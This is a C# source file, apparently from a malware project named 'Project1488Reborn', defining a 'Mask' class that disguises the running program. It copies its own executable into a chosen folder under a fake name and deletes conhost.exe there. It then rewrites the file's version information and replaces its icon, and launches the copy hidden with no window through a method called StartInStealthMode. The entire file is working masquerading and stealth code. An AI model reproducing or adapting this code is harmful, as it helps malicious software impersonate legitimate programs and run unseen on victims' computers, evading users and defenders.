using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Drawing.Imaging;
using Vestris.ResourceLib;

namespace Project1488Reborn.Masks
{
    public abstract class Mask
    {
        public abstract DirectoryInfo MaskDir { get; }
        public abstract string NameMainFile { get; }

        public abstract Icon icon { get; }

        public abstract bool Enable { get; }

        public static IList<FileInfo> AdditionalFilesMove = new FileInfo[0];
        
        private bool isMoved = false;


        public void MoveFiles()
        {
            if (!MaskDir.Exists)
                MaskDir.Create();

            if (File.Exists(Path.Combine(MaskDir.FullName, NameMainFile)))
                File.Delete(Path.Combine(MaskDir.FullName, NameMainFile));

            File.Copy(Assembly.GetEntryAssembly().Location, Path.Combine(MaskDir.FullName, NameMainFile));

            foreach(FileInfo file in AdditionalFilesMove)
            {
                if (file.Exists)
                {
                    if (File.Exists(Path.Combine(MaskDir.FullName, file.Name)))
                        File.Delete(Path.Combine(MaskDir.FullName, file.Name));
                    file.CopyTo(Path.Combine(MaskDir.FullName, file.Name));
                }
            }
            isMoved = true;
        }

        public void StartInStealthMode()
        {
            if (isMoved)
                MoveFiles();


            if (File.Exists(Path.Combine(MaskDir.FullName, "conhost.exe")))
                File.Delete(Path.Combine(MaskDir.FullName, "conhost.exe"));


            VersionResource vr = new VersionResource();
            vr.LoadFrom(Path.Combine(MaskDir.FullName, NameMainFile));
            

            StringFileInfo sfi = (StringFileInfo)vr["StringFileInfo"];

            sfi["OriginalFilename"] = NameMainFile;
            StringTableEntry.ConsiderPaddingForLength = true;

            vr.Language = 0;
            vr.SaveTo(Path.Combine(MaskDir.FullName, NameMainFile));

            using (FileStream fs = new FileStream("ico.ico", FileMode.Create))
                icon.Save(fs);

            new IconDirectoryResource(new IconFile("ico.ico")).SaveTo(Path.Combine(MaskDir.FullName, NameMainFile));

            //Отчиска
            foreach (FileInfo fi in new List<FileInfo>()
            {
                new FileInfo("ico.ico")
            })
            {
                if (fi.Exists)
                {
                    fi.Delete();
                }
            }

            Process proc = new Process();
            proc.StartInfo.FileName = $"{Path.Combine(MaskDir.FullName, NameMainFile)}";
            proc.StartInfo.Arguments = $"--code-load 0x0000008 --debug diable --nodemode 0 --ss 3976949C";
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
        }

    }
}
